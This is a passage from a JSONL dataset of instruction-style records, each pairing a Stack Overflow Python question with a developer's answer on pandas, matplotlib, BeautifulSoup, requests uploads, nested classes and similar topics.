error:<\/p>\n\n<pre><code>Muffin\n--------------------------------------------------------------------------\nIndexError                                Traceback (most recent call last)\n&lt;ipython-input-68-e1844b3cae82&gt; in &lt;module&gt;\n     61     for item in get_cert:\n     62         for i in range(0, len(item)-2):\n---&gt; 63             the_dict= json.loads(the_dict['categories'])[i]['title']\n\n        global get_cert = {'categories': '[{\"title\":\"Name\",\"desc\":\"Mike\"},{\"title\":\"Food\",\"desc\":\"Muffin\"}]'}\n        global i = 2\n     64             if muff_filter == 'Food':\n     65                 print(json.loads(the_dict['categories'])[i]['desc'])\n\nIndexError: list index out of range\n<\/code><\/pre>","output_text":"<p>If you have multiple blobs of json data in <code>the_dict<\/code> iterate over each blob:<\/p>\n\n<pre><code>for jsondata in the_dict.values(): \n    for d in json.loads(jsondata):\n        if d.get('title') == 'Food':\n            print(d['desc'])\n<\/code><\/pre>\n\n<p>or if you know there is only one blob of json data in <code>the_dict<\/code> and it's under the key <code>'categories'<\/code>:<\/p>\n\n<pre><code>for d in json.loads(the_dict['categories']):\n    if d.get('title') == 'Food':\n        print(d['desc'])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n how to get matplotlib plot data as numpy array<p>I am plotting figure as:<\/p>\n<pre><code>plt.imshow(image, cmap='gray', interpolation='none')\nplt.imshow(masked_contour, cmap='cool', interpolation='none', alpha=0.7)\nplt.show()\n<\/code><\/pre>\n<p>The figure shows in greyscale with a blue contour inside it.<\/p>\n<p>Now I want to get this figure as a <code>numpy<\/code> array (also not as a masked array). One way can be, save the plot as an image, then read it from there. Is there any better approach?<\/p>","output_text":"<pre><code>fig = plt.figure(figsize=(20, 20)) # this is imp for sizing\n# plot\nplt.imshow(image, cmap='gray', interpolation='none')\nplt.imshow(masked_contour, cmap='cool', interpolation='none', alpha=0.7)\n# get image as np.array\ncanvas = plt.gca().figure.canvas\ncanvas.draw()\ndata = np.frombuffer(canvas.tostring_rgb(), dtype=np.uint8)\nimage = data.reshape(canvas.get_width_height()[::-1] + (3,))\n# (Optional) show image\nplt.imshow(image)\nplt.show()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Scrape the text below a header inside a list item into a column with BeautifulSoup and pandas<p>I am trying to scrape and store some items using BeautifulSoup and pandas. The code below only partially works. As you can see it scrapes 'Engine426\/425 HP' whereas I only want the string '426\/425 HP' to be stored in the 'engine' column. I would like to scrape all 4 h5 strings in the HTML below (Please refer to the desired output below). I hope someone can help me out, thanks!<\/p>\n\n<pre><code>import numpy as np\nimport pandas as pd\nfrom bs4 import BeautifulSoup\nimport requests\nimport re\n\nmain_url = \"https:\/\/www.example.com\/\"\n\ndef getAndParseURL(url):\n    result = requests.get(url)\n    soup = BeautifulSoup(result.text, 'html.parser')\n    return(soup)\n\nsoup = getAndParseURL(main_url)\n\nengine = []\n\nengine.append(soup.find(\"ul\", class_ = re.compile('list-inline lot-breakdown-list')).li.text)\n\nscraped_data = pd.DataFrame({'engine': engine})\n\nscraped_data.head()\n\n              engine\n0   Engine426\/425 HP\n\n<\/code><\/pre>\n\n<p>HTML<\/p>\n\n<pre><code>&lt;div class=\"lot-breakdown\"&gt;\n    &lt;ul class=\"list-inline lot-breakdown-list\"&gt;\n        &lt;li&gt;\n            &lt;h5&gt;Engine&lt;\/h5&gt;426\/425 HP&lt;\/li&gt;\n        &lt;li&gt;\n            &lt;h5&gt;Trans&lt;\/h5&gt;Automatic&lt;\/li&gt;\n        &lt;li&gt;\n            &lt;h5&gt;Color&lt;\/h5&gt;Alpine White&lt;\/li&gt;\n        &lt;li&gt;\n            &lt;h5&gt;Interior&lt;\/h5&gt;Black&lt;\/li&gt;\n    &lt;\/ul&gt;\n&lt;\/div&gt;\n<\/code><\/pre>\n\n<p>Desired output<\/p>\n\n<pre><code>scraped_data[['engine', 'trans', 'color', 'interior']] = pd.DataFrame([['426\/425 HP', 'Automatic', 'Alpine White', 'Black']], index=scraped_data.index)\nscraped_data\n\n              engine        trans          color  interior\n0         426\/425 HP    Automatic   Alpine White     Black\n<\/code><\/pre>","output_text":"<p>You can achieve that in too many ways :<\/p>\n\n<pre><code>    from bs4 import BeautifulSoup , NavigableString\n    import requests\n\n    main_url = \"https:\/\/www.example.com\/\"\n\n    def getAndParseURL(url):\n        result = requests.get(url)\n        soup = BeautifulSoup(result.text, 'html.parser')\n        return(soup)\n\n    soup = getAndParseURL(main_url)\n    #ul   = soup.select('ul[class=\"list-inline lot-breakdown-list\"] li')\n    #for li in ul :\n         #x = li.find(text=True, recursive=False) # Will give you the text of the li skipping the text of child tag\n         #y = ' '.join([t for t in li.contents if type(t)== NavigableString]) # contents [&lt;h5&gt;Engine&lt;\/h5&gt;, '426\/425 HP'] the text you want has a type of NavigableString and That's what we are returning .\n    ul = soup.select('ul[class=\"list-inline lot-breakdown-list\"] li', recursive=True)\n    lis_e = []\n    for li in ul:\n        lis = []\n        lis.append(li.contents[1])\n        lis_e.extend(lis)\n\n    engine.append(lis_e[0])\n    trans.append(lis_e[1])\n    color.append(lis_e[2])\n    interior.append(lis_e[3])\n\n    scraped_data = pd.DataFrame({'engine': engine, 'transmission': trans, 'color': color, 'interior': interior})\n    scraped_data\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Does having a wrapper object return value (e.g. Integer) cause auto boxing in Java?<p>I couldn't find a definitive answer for this seemingly simple question. If I write a method like this:<\/p>\n<pre><code>public Integer getAnInt() {\n  int[] i = {4};\n  return i[0];\n}\n<\/code><\/pre>\n<p>is the return value autoboxed into an Integer, or does it depend on what happens to the value after it's returned (e.g. whether the variable it is assigned to is declared as an Integer or int)?<\/p>","output_text":"<h1>Yes, boxed<\/h1>\n<p>It will be (auto)boxed in the bytecode (<code>.class<\/code> file) because it's part of the public API, so other code might depend on the return value being an <code>Integer<\/code>.<\/p>\n<p>The boxing and unboxing might be removed at runtime by the JITter under the right circumstances, but I don't know if it does that sort of thing.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n I want to put a list on a string<p>I'm getting a png file name from a file then and using regex to specify a 4 digit number png file name, removing the punctuations marks and saving it to another file<\/p>\n<p>What has stumped me was trying to put every individual value on the list in a string like:<\/p>\n<pre><code>&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/{HERE}.png&quot; &gt;&lt;\/div&gt;\n\n<\/code><\/pre>\n<p>And then save it to the file as:<\/p>\n<pre><code>&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/1432.png&quot; &gt;&lt;\/div&gt;\n&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/1250.png&quot; &gt;&lt;\/div&gt;\n&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/1324.png&quot; &gt;&lt;\/div&gt;\n<\/code><\/pre>\n<p>This is the code<\/p>\n<pre><code>import re\nimport pyperclip\n\ndef remove_punc(string):\n    punc = '''!()-[]{};:'&quot;\\, &lt;&gt;.\/?@#$%^&amp;*_~'''\n    for ele in string:  \n        if ele in punc:  \n            string = string.replace(ele, &quot;&quot;) \n    return string\n \n\n\n\ntext_file = open(r'C:\\My Web Sites\\\u200f\u200fimage_data(1).txt', 'r') \n    \ns = text_file.read()\n\ntext_file.close()\nstring_pattern = r&quot;\\d{4}\\.&quot; \n\n\nregex_pattern = re.compile(string_pattern)\n\n\n# find all the matches in string one\nresult = regex_pattern.findall(s)\n\nresult = [remove_punc(i) for i in result]\n\n\nwith open(r'C:\\My Web Sites\\1.txt', 'w') as fp:\n    for item in result:\n        # write each item on a new line\n        fp.write(&quot;%s\\n&quot; % item)\n        \n\nfp.close()\n\n<\/code><\/pre>\n<p>EDIT<\/p>\n<p>This is a sample of the text file<\/p>\n<pre><code>&lt;div class=&quot;cell-imgs&quot;&gt;&lt;div class=&quot;character-thumbnail&quot;&gt;&lt;img src=&quot;resources\/images\/bgs\/5.png&quot; class=&quot;character-thumbnail-background&quot;&gt;&lt;img class=&quot;character-thumbnail-image&quot; src=&quot;resources\/images\/thumb\/1535.png&quot; onerror=&quot;this.src='resources\/images\/thumb\/noimage.png';&quot;&gt;&lt;img rel=&quot;popover&quot; tabindex=&quot;0&quot; src=&quot;resources\/images\/frames\/5.png&quot; class=&quot;character-thumbnail-frame&quot; data-html=&quot;true&quot; data-trigger=&quot;focus&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; data-content=&quot;Rarity: 5\u2605&lt;br\/&gt;Level: 1\/60&lt;br\/&gt;Level: 0\/4&lt;br\/&gt;Level: 1\/5&lt;br\/&gt;: 0%&quot; title=&quot;&quot; data-original-title=&quot;&lt;font color='red'&gt;&lt;br\/&gt;(version)&lt;\/font&gt;&quot;&gt;&lt;img src=&quot;resources\/images\/elements\/3.png&quot; class=&quot;character-thumbnail-element&quot;&gt;&lt;\/div&gt;&lt;div class=&quot;character-thumbnail&quot;&gt;&lt;img src=&quot;resources\/images\/bgs\/5.png&quot; class=&quot;character-thumbnail-background&quot;&gt;&lt;img class=&quot;character-thumbnail-image&quot; src=&quot;resources\/images\/thumb\/1510.png&quot; onerror=&quot;this.src='resources\/images\/thumb\/noimage.png';&quot;&gt;&lt;img rel=&quot;popover&quot; tabindex=&quot;1&quot; src=&quot;resources\/images\/frames\/5.png&quot; class=&quot;character-thumbnail-frame&quot; data-html=&quot;true&quot; data-trigger=&quot;focus&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; data-content=&quot;Rarity: 5\u2605&lt;br\/&gt;Level: 1\/80&lt;br\/&gt;Level: 4\/4&lt;br\/&gt;Level: 1\/5&lt;br\/&gt;: 0%&quot; title=&quot;&quot; data-original-title=&quot;&lt;font color='#F96700'&gt;&lt;br\/&gt;(version)&lt;\/font&gt;&quot;&gt;&lt;img src=&quot;resources\/images\/elements\/5.png&quot; class=&quot;character-thumbnail-element&quot;&gt;&lt;\/div&gt;&lt;div class=&quot;character-thumbnail&quot;&gt;&lt;img src=&quot;resources\/images\/bgs\/5.png&quot; class=&quot;character-thumbnail-background&quot;&gt;&lt;img class=&quot;character-thumbnail-image&quot; src=&quot;resources\/images\/thumb\/1403.png&quot; onerror=&quot;this.src='resources\/images\/thumb\/noimage.png';&quot;&gt;&lt;img rel=&quot;popover&quot; tabindex=&quot;2&quot; src=&quot;resources\/images\/frames\/5.png&quot; class=&quot;character-thumbnail-frame&quot; data-html=&quot;true&quot; data-trigger=&quot;focus&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; data-content=&quot;Rarity: 5\u2605&lt;br\/&gt;Level: 1\/80&lt;br\/&gt;Level: 4\/4&lt;br\/&gt;Level: 1\/5&lt;br\/&gt;: 0%&quot; title=&quot;&quot; data-original-title=&quot;&lt;font color='#071BA0'&gt;&lt;br\/&gt;(version)&lt;\/font&gt;&quot;&gt;&lt;img src=&quot;resources\/images\/elements\/4.png&quot; class=&quot;character-thumbnail-element&quot;&gt;&lt;\/div&gt;&lt;div class=&quot;character-thumbnail&quot;&gt;&lt;img src=&quot;resources\/images\/bgs\/5.png&quot; class=&quot;character-thumbnail-background&quot;&gt;&lt;img class=&quot;character-thumbnail-image&quot; src=&quot;resources\/images\/thumb\/1388.png&quot; onerror=&quot;this.src='resources\/images\/thumb\/noimage.png';&quot;&gt;&lt;img rel=&quot;popover&quot; tabindex=&quot;3&quot; src=&quot;resources\/images\/frames\/5.png&quot; class=&quot;character-thumbnail-frame&quot; data-html=&quot;true&quot; data-trigger=&quot;focus&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; data-content=&quot;Rarity: 5\u2605&lt;br\/&gt;Level: 1\/80&lt;br\/&gt;Level: 4\/4&lt;br\/&gt;Level: 1\/5&lt;br\/&gt;: 0%&quot; title=&quot;&quot; data-original-title=&quot;&lt;font color='#F96700'&gt;&lt;br\/&gt;(version)&lt;\/font&gt;&quot;&gt;&lt;img src=&quot;resources\/images\/elements\/5.png&quot; class=&quot;character-thumbnail-element&quot;&gt;&lt;\/div&gt;&lt;div class=&quot;character-thumbnail&quot;&gt;&lt;img src=&quot;resources\/images\/bgs\/6.png&quot; class=&quot;character-thumbnail-background&quot;&gt;&lt;img class=&quot;character-thumbnail-image&quot; src=&quot;resources\/images\/thumb\/1323.png&quot; onerror=&quot;this.src='resources\/images\/thumb\/noimage.png';&quot;&gt;&lt;img rel=&quot;popover&quot; tabindex=&quot;4&quot; src=&quot;resources\/images\/frames\/6.png&quot; class=&quot;character-thumbnail-frame&quot; data-html=&quot;true&quot; data-trigger=&quot;focus&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; data-content=&quot;Rarity: 6\u2605&lt;br\/&gt;Level: 200\/200&lt;br\/&gt;Level: 4\/4&lt;br\/&gt;Level: 1\/5&lt;br\/&gt;: 150%&lt;br\/&gt;1: 0\/10&lt;br\/&gt;2: 0\/10&lt;br\/&gt;3: 0\/10&lt;br\/&gt;&quot; title=&quot;&lt;font color='red'&gt;&lt;br\/&gt;(version)&lt;\/font&gt;&quot;&gt;&lt;img src=&quot;resources\/images\/elements\/3.png&quot; class=&quot;character-thumbnail-element&quot;&gt;&lt;\/div&gt;&lt;div class=&quot;character-thumbnail&quot;&gt;&lt;img src=&quot;resources\/images\/bgs\/5.png&quot; class=&quot;character-thumbnail-background&quot;&gt;&lt;img class=&quot;character-thumbnail-image&quot; src=&quot;resources\/images\/thumb\/1322.png&quot;\n<\/code><\/pre>\n<p>Output<\/p>\n<pre><code>1535\n1510\n1403\n1388\n1323\n1322\n<\/code><\/pre>","output_text":"<p>To create your file you can use <a href=\"https:\/\/docs.python.org\/3\/library\/stdtypes.html#str.format\" rel=\"nofollow noreferrer\"><code>str.format<\/code><\/a>. For example:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>s = &quot;&quot;&quot;&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/{}.png&quot;&gt;&lt;\/div&gt;&quot;&quot;&quot;\n\nresult = [1432, 1250, 1324]  # &lt;-- your result with removed punctuations\n\nwith open(&quot;data.txt&quot;, &quot;w&quot;) as fp:\n    for item in result:\n        print(s.format(item), file=fp)\n<\/code><\/pre>\n<p>creates <code>data.txt<\/code> with content:<\/p>\n<pre class=\"lang-html prettyprint-override\"><code>&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/1432.png&quot;&gt;&lt;\/div&gt;\n&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/1250.png&quot;&gt;&lt;\/div&gt;\n&lt;div class=&quot;parent&quot;&gt;&lt;img class=&quot;img&quot; title=&quot;&quot; src=&quot;images\/char\/1324.png&quot;&gt;&lt;\/div&gt;\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Security - App Engine multitenancy (Python)<p>We have legacy .exe solution running on industrial client's desktops that I need to port over to Google App Engine. All clients will have the same version of the app, no code customization. We need to be sure that data will not be leaked between different clients of the new GAE app or be snooped on by some external party.<\/p>\n<p>So I have a couple of questions that I hope someone will be able to help me out.<\/p>\n<p><strong>Option 1:<\/strong> Use namespaces to separate client's data. This seems quite robust at the Datastore level; without the proper namespace data would not be served. Since we have the company name of each user, I would presume this would be quite secure against leaks.<\/p>\n<p><strong>Q1:<\/strong> Which precautions do I need to take to avoid someone guessing or hacking at URLs to get to unauthorized data?<\/p>\n<p><strong>Option 2:<\/strong> We could have a separate instance of the code and datastore for each client. This would give the optimal separation between clients.<\/p>\n<p><strong>Q2:<\/strong> Is there a tool or API to &quot;clone&quot; a given GAE app to many clients? We would feed the list of clients and update the code to all those instances in one go.<\/p>\n<p>Thanks!<\/p>","output_text":"<blockquote>\n<p>Which precautions do I need to take to avoid someone guessing or hacking at URLs to get to unauthorized data?<\/p>\n<\/blockquote>\n<p>Namespaces are not a security mechanism for Datastore. A user with access to one partition in a project has access to all partitions in the project. Namespaces provide a way to organize your entities within a project.<\/p>\n<blockquote>\n<p>Is there a tool or API to &quot;clone&quot; a given GAE app to many clients? We would feed the list of clients and update the code to all those instances in one go.<\/p>\n<\/blockquote>\n<p>To have completely isolated instances of services, you can create new projects programmatically using the <a href=\"https:\/\/cloud.google.com\/resource-manager\/docs\/creating-project\" rel=\"nofollow noreferrer\">Cloud Resource Manager API<\/a> and access resources across projects.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Is there a way to turn off hover for certain functions in VSCode?<p>In VSCode, I have the hovers enabled that show me the docstrings of the functions (etc.) I use. I appreciate that functionality. However, some of the hovers get annoying with time. First and foremost, the one for <code>print<\/code>. I never need it, and it is huge. It is particularly annoying in Jupyter notebooks, where I use <code>print<\/code> quite often.<\/p>\n\n<p>Hence, my question: Is there a way to disable the hover for certain functions specifically?<\/p>\n\n<p>I have looked through the VSCode documentation but haven't found anything.<\/p>","output_text":"<p>No, there is no way to turn off hovers on select items.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pandas to_datetime not recognizing date in data frame<p>I have a dataset in pd format from yahoo finance API and I am trying to do the following..\nIt doesn't recognize the Date in the dataframe and I don't know why?\nCan you please guide me what is the issue here? Bellow is my code and what I am trying to do.<\/p>\n<pre><code># import data \ndata = pdr.get_data_yahoo('spy', \n                          start=datetime.datetime(2015, 9, 30), \n                          end=datetime.datetime(2021, 5, 15))\n\ntrain_dates = pd.to_datetime(data['Date'])\n<\/code><\/pre>\n<p>It gives me the following error.<\/p>\n<pre><code>---------------------------------------------------------------------------\nKeyError                                  Traceback (most recent call last)\n\/usr\/local\/lib\/python3.7\/dist-packages\/pandas\/core\/indexes\/base.py in get_loc(self, key, method, tolerance)\n   2897             try:\n-&gt; 2898                 return self._engine.get_loc(casted_key)\n   2899             except KeyError as err:\n\npandas\/_libs\/index.pyx in pandas._libs.index.IndexEngine.get_loc()\n\npandas\/_libs\/index.pyx in pandas._libs.index.IndexEngine.get_loc()\n\npandas\/_libs\/hashtable_class_helper.pxi in pandas._libs.hashtable.PyObjectHashTable.get_item()\n\npandas\/_libs\/hashtable_class_helper.pxi in pandas._libs.hashtable.PyObjectHashTable.get_item()\n\nKeyError: 'Date'\n\nThe above exception was the direct cause of the following exception:\n\nKeyError                                  Traceback (most recent call last)\n2 frames\n\/usr\/local\/lib\/python3.7\/dist-packages\/pandas\/core\/indexes\/base.py in get_loc(self, key, method, tolerance)\n   2898                 return self._engine.get_loc(casted_key)\n   2899             except KeyError as err:\n-&gt; 2900                 raise KeyError(key) from err\n   2901 \n   2902         if tolerance is not None:\n\nKeyError: 'Date'.\n<\/code><\/pre>","output_text":"<p>this pulls the Date into the index. Using ipython, you can see the index is already datetime. If you need to call an index, the syntax is different.<\/p>\n<pre><code>eg: train_dates = pd.to_datetime(data.index)\n<\/code><\/pre>\n<p>Ipython output:<\/p>\n<pre><code>In [389]: data = pdr.get_data_yahoo('spy', ^M\n     ...:                           start=datetime.datetime(2015, 9, 30), ^M\n     ...:                           end=datetime.datetime(2021, 5, 15))\n\nIn [390]: data\nOut[390]:\n              High     Low    Open   Close        Volume  Adj Close\nDate\n2015-09-30 191.830 189.440 190.370 191.630 163452000.000    172.394\n2015-10-01 192.490 189.820 192.080 192.130 131079000.000    172.844\n2015-10-02 195.030 189.120 189.770 195.000 211003300.000    175.426\n2015-10-05 198.740 196.330 196.460 198.470 126320800.000    178.548\n2015-10-06 198.980 197.000 198.310 197.790 110274500.000    177.936\n...            ...     ...     ...     ...           ...        ...\n2021-05-10 422.740 417.810 422.500 417.940  81852400.000    417.940\n2021-05-11 415.270 410.060 413.100 414.210 116888000.000    414.210\n2021-05-12 412.590 404.000 411.230 405.410 134811000.000    405.410\n2021-05-13 412.350 407.020 407.070 410.280 106394000.000    410.280\n2021-05-14 417.490 413.180 413.210 416.580  82123100.000    416.580\n\n[1416 rows x 6 columns]\n\nIn [391]: data.dtypes\nOut[391]:\nHigh         float64\nLow          float64\nOpen         float64\nClose        float64\nVolume       float64\nAdj Close    float64\ndtype: object\n\nIn [392]: data.index\nOut[392]:\nDatetimeIndex(['2015-09-30', '2015-10-01', '2015-10-02', '2015-10-05',\n               '2015-10-06', '2015-10-07', '2015-10-08', '2015-10-09',\n               '2015-10-12', '2015-10-13',\n               ...\n               '2021-05-03', '2021-05-04', '2021-05-05', '2021-05-06',\n               '2021-05-07', '2021-05-10', '2021-05-11', '2021-05-12',\n               '2021-05-13', '2021-05-14'],\n              dtype='datetime64[ns]', name='Date', length=1416, freq=None)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to call a inner\/nested class with a function<p>I don't know if the title describes my problem correctly. Maybe it is a bit misleading.\nI want to call the class Decoder within my Class ABC with the funtion func1 (that is inside my class ABC) but I can't get it work.<\/p>\n<pre><code>class ABC():\n    def __init__(self):\n        super(ABC, self).__init__()\n        \n    def func1(self):\n        encoder=self.Encoder(1)\n    \n    class Encoder():\n        def __init__(self, vocab_size):\n            super(self.Encoder, self).__init__()\n            self.vocab_size = vocab_size\nf = ABC()\nf.func1()\n<\/code><\/pre>\n<p>It gives me this error:<\/p>\n<pre><code>---------------------------------------------------------------------------\nAttributeError                            Traceback (most recent call last)\n&lt;ipython-input-19-2b76a7e09b6e&gt; in &lt;module&gt;\n     11             self.vocab_size = vocab_size\n     12 f = ABC()\n---&gt; 13 f.func1()\n     14 \n\n&lt;ipython-input-19-2b76a7e09b6e&gt; in func1(self)\n      4 \n      5     def func1(self):\n----&gt; 6         encoder=self.Encoder(1)\n      7 \n      8     class Encoder():\n\n&lt;ipython-input-19-2b76a7e09b6e&gt; in __init__(self, vocab_size)\n      8     class Encoder():\n      9         def __init__(self, vocab_size):\n---&gt; 10             super(self.Encoder, self).__init__()\n     11             self.vocab_size = vocab_size\n     12 f = ABC()\n\nAttributeError: 'Encoder' object has no attribute 'Encoder'\n<\/code><\/pre>\n<p>I only used self.Encoder in the first place because PyCharm told me &quot;Unsolved reference&quot;\nI then tried it without the self and got this error:<\/p>\n<pre><code>---------------------------------------------------------------------------\nNameError                                 Traceback (most recent call last)\n&lt;ipython-input-20-a9effce8ca1b&gt; in &lt;module&gt;\n     11             self.vocab_size = vocab_size\n     12 f = ABC()\n---&gt; 13 f.func1()\n     14 \n\n&lt;ipython-input-20-a9effce8ca1b&gt; in func1(self)\n      4 \n      5     def func1(self):\n----&gt; 6         encoder=self.Encoder(1)\n      7 \n      8     class Encoder():\n\n&lt;ipython-input-20-a9effce8ca1b&gt; in __init__(self, vocab_size)\n      8     class Encoder():\n      9         def __init__(self, vocab_size):\n---&gt; 10             super(Encoder, self).__init__()\n     11             self.vocab_size = vocab_size\n     12 f = ABC()\n\nNameError: name 'Encoder' is not defined\n<\/code><\/pre>\n<p>How can I get this to work without removing the nested class structure?<\/p>","output_text":"<p>As an inner class, <code>Encoder<\/code> can be considered a static variable on <code>ABC<\/code>. Consequently, you access it like any other static variable: <code>ABC.Encoder<\/code>:<\/p>\n<pre><code>class ABC():\n    def __init__(self):\n        super(ABC, self).__init__()\n    def func1(self):\n        encoder=ABC.Encoder(1)\n    \n    class Encoder():\n        def __init__(self, vocab_size):\n            super(ABC.Encoder, self).__init__()\n            self.vocab_size = vocab_size\n<\/code><\/pre>\n<p>Keep in mind that <code>self<\/code>, when it's the first parameter of an instance method, refers to the <em>instance<\/em> that the method is being called on, not the <em>class<\/em>. It's generally considered poor practice to call static methods on an instance (though you can use <code>instance.__class__.method()<\/code> as a workaround if you really need to, that's almost never necessary because you almost always know which class's statics you want to invoke).<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Merging rows based on condition of two rows?<p>Fairly new to this, not sure how to ask the question in a better way but- here's my data (also I don't understand how to type this out in code...)<\/p>\n<pre><code>Date       Sex      Cases\n20200103  Female     1\n20200103  Female     1\n20200103  Female     2\n20200103  Male       0\n20200103  Male       1\n20200104  Female     2\n20200104  Female     1\n20200104  Male       2\n20200104  Male       1\n<\/code><\/pre>\n<p>How do I merge the ones with same date AND also by gender (and add the cases together), so it looks something like this:<\/p>\n<pre><code>Date       Sex      Cases\n20200103  Female     3\n20200103  Male       1\n20200104  Female     3\n20200104  Male       3\n<\/code><\/pre>","output_text":"<pre class=\"lang-py prettyprint-override\"><code>df = df.groupby(['Date', 'Sex'], as_index=False).sum()\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; df\n       Date     Sex  Cases\n0  20200103  Female      4\n1  20200103    Male      1\n2  20200104  Female      3\n3  20200104    Male      3\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Change values of a column based on most frequently value on other column<p>I have an <code>pandas.DataFrame<\/code> like that:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>expl = {'label':['A','A','A','B','B','B','C','C','C','C','C','A','A'],\n'predicted':[1,1,3,2,2,1,3,2,3,4,4,-1,-2]}\n\n        }\nmyDf = DataFrame(expl)\n<\/code><\/pre>\n<p>I wanna to  create a new column with the values on 'predicted' column but  &quot;renamed&quot; with  the most frequently values on 'predicted' from each 'label'.<\/p>\n<p>I'm currently using the following code which works as expected:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for group in myDf['predicted'].unique():\n    if group &gt;=0:\n        dfg  = myDf.loc[myDf['predicted']==group, ['label']]\n        rename = myDf.loc[myDf['predicted']==group, ['label']].groupby(['label']).size().idxmax()\n        myDf.loc[myDf['predicted']==group,'renamed']= rename\n    else:\n        myDf.loc[myDf['predicted']==group,'renamed']= 'NA'\n<\/code><\/pre>\n<p>But I don't think it's the best way to do this. Is there any way to do this better?(in speed or memory)<\/p>\n<p>I also think in save the most frequently values on a <code>dict<\/code> and use <code>myDf['predict'].apply(lambda v: d[v] )<\/code> to replace the values, but doesn't seem to be faster.<\/p>\n<p><strong>Note<\/strong>: Negative values will be considered Not Available(<code>'NA'<\/code>).<\/p>\n<p>Expected Output:<\/p>\n<pre><code>    label   predicted   renamed\n0   A   1   A\n1   A   1   A\n2   A   3   C\n3   B   2   B\n4   B   2   B\n5   B   1   A\n6   C   3   C\n7   C   2   B\n8   C   3   C\n9   C   4   C\n10  C   4   C\n11  A   -1  NA\n12  A   -2  NA \n<\/code><\/pre>","output_text":"<p>Try <code>groupby()<\/code>+<code>transform()<\/code> and calculate the mode and use <code>mask()<\/code> to create NaN where 'predicted' is negative number:<\/p>\n<pre><code>myDf['renamed']=(myDf.groupby('predicted')['label']\n                    .transform(lambda x:x.mode().iloc[0])\n                    .mask(myDf['predicted'].le(-1)))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n 422 when posting file with requests<p>So I've been trying to figure this out all day but haven't been able to make any progress.  I have this curl command, which works:<\/p>\n<pre><code>curl -X POST -H &quot;x-hermes-key: &lt;KEY&gt;&quot; -H &quot;Accept: application\/json&quot;  --form file='@example_files\/ex1.pdf' &lt;URL&gt; -kv \n<\/code><\/pre>\n<p>When I try to run its equivalent in python with requests, I get a 422 error:<\/p>\n<pre><code>header = {\n            &quot;Accept&quot;: &quot;application\/json&quot;,\n            &quot;X-Hermes-Key&quot;: &lt;KEY&gt;\n        }\n\nf = {'file': open(&quot;example_files\/ex1.pdf&quot;, &quot;rb&quot;)}\nr_create = requests.post(url=&lt;URL&gt;, headers=header, files=f)\n<\/code><\/pre>\n<p>Can anyone help me see where I'm making a mistake?<\/p>","output_text":"<p>The following should match the curl command and POST with content-type=multipart\/form-data.<\/p>\n<p>You can set the filename, content_type, and headers explicitly in a tuple for the 'file' value.<\/p>\n<pre class=\"lang-python prettyprint-override\"><code>headers = {\n            &quot;Accept&quot;: &quot;application\/json&quot;,\n            &quot;X-Hermes-Key&quot;: &lt;KEY&gt;\n        }\n\nurl = &lt;URL&gt;\n\nfiles = [('file', ('ex1.pdf', open('example_files\/ex1.pdf', 'rb'),\n                     'application\/octet-stream'))]\nr = requests.post(url=url, headers=headers, files=files)\nprint(r.status_code)\n<\/code><\/pre>"}
